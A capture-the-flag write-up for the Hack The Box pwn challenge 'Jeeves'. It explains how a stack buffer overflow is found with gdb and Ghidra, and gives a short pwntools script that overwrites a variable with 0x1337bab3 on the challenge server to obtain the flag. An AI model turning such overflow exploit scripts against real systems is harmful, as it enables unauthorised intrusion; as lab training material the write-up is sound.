# Jeeves
> Write-up author: jon-brandy
## DESCRIPTION:
How are you doing, sir?
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209353724-037d0521-31f6-4b64-8b90-1ab691d4ce64.png)


2. Now check the file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209353779-5395467e-52a7-4de3-92db-9b63fd8a992e.png)


3. Now, we know it's a binary file.
4. Let's check the binary's protection.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209353854-cccbe427-5fe0-4cd1-afa4-b7463e3fa4d1.png)


5. Based on it, we know that we can do bufferoverflow concept.
6. Anyway let's run chmod so we can execute the binary file. Then execute the file.
7. Run the file in gdb, and paste 1024 cyclic pattern as the input.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209354390-9bdf1805-d3a1-4b52-b4f3-f0b193e32f4f.png)


8. Got segmentation fault, now copy all characters from RBP.

![image](https://user-images.githubusercontent.com/70703371/209354570-ead7a0fe-c371-44d0-995a-4c9214cf4186.png)


9. And check the correct bytes to overflow the buffer by run `cylic -l`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209354843-ee59fa72-e273-4ac3-a51a-9b301354bddf.png)


10. Great! Now we know the correct bytes to overflow the buffer is 64 bytes, so we need to add 60 padding bytes.
11. Now let's decompile the file using ghidra and check the `main()` function.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209355234-655d33ae-f4ff-48c7-a2b0-2bfc70c9e82e.png)


12. Based from the `main()` function, we need to overwrite the `local_c` values so to **0x1337bab3** so we can get the flag.
13. To solve this we can convert the hex in little-endian format -> \xb3\xba\x37\x13.
14. Then add them after the 60 bytes.
15. For this solution, i made a python script using pwntools.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')
context.log_level = 'debug'
#sh = remote('68.183.47.198',31162) #68.183.47.198:31162
sh = process("nc")
sh.sendline("68.183.47.198 31162")
p = b'A' * 60
p += p64(322419379) # 0x1337bab3
#sh.recvuntil("? ")
sh.sendline(p)
sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/209359846-75879f05-0888-475d-aeb6-0c2d07325684.png)


16. Got the flag!

## FLAG

```
HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}
```

